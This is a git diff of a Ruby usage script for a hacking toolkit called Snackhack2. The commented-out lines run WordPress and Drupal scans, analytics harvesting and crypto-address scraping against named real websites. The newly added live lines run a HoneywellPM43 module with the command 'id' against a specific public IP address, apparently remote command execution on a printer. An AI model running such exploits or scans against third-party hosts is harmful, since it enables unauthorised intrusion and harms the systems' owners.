@@ -14,8 +14,8 @@ require './lib/snackHack2'
 # s.curl
 
 ### Word Press#
-#wp = Snackhack2::WordPress.new("https://www.piemonteinnova.it/")
-#wp.wp_log
+# wp = Snackhack2::WordPress.new("https://www.piemonteinnova.it/")
+# wp.wp_log
 # ["https://google.com", "https://kinsta.com", "https://porchlightshop.com", "https://www.drrajatgupta.com"].each do |site|
 #   wp = Snackhack2::WordPress.new(site)
 #   puts "#{site}: "
@@ -50,9 +50,9 @@ require './lib/snackHack2'
 
 ## Grab gooogle Analytics from a site. this could be used to find similar sites
 
-#t = Snackhack2::GoogleAnalytics.new("https://training.vib.be/drupal/login")
+# t = Snackhack2::GoogleAnalytics.new("https://training.vib.be/drupal/login")
 
-#t.run
+# t.run
 
 ## Extract a bunch of different types of crypto addresses from a site.
 
@@ -88,9 +88,9 @@ require './lib/snackHack2'
 # Snackhack2::IpLookup.new("https://google.com").run
 # wp = Snackhack2::GoogleAnalytics.new("https://www.drrajatgupta.com").run
 
-#ca = Snackhack2::CryptoExtractWebsite.new('https://www.revuo-xmr.com/weekly/issue-201')
-# ca.save_file = falseputs 
-#ca.run
+# ca = Snackhack2::CryptoExtractWebsite.new('https://www.revuo-xmr.com/weekly/issue-201')
+# ca.save_file = falseputs
+# ca.run
 
 # wp = Snackhack2::WPForoForum.new("http://www.example.com")
 # wp.run
@@ -104,8 +104,8 @@ e.max_depth = 2
 puts e.max_depth
 =end
 
-#d = Snackhack2::Drupal.new("https://physiologycore.umn.edu/")
-#d.all
+# d = Snackhack2::Drupal.new("https://physiologycore.umn.edu/")
+# d.all
 =begin
 wp = Snackhack2::WordPress.new("https://adk.org")
 wp.all_in_one_seo
@@ -113,3 +113,9 @@ wp.all_in_one_seo
 =end
 
 # Snackhack2::BannerGrabber.new("http://95.142.29.235").apache2
+
+s = Snackhack2::HoneywellPM43.new("http://81.84.149.129:80")
+
+s.command = "id"
+puts s.command
+s.run
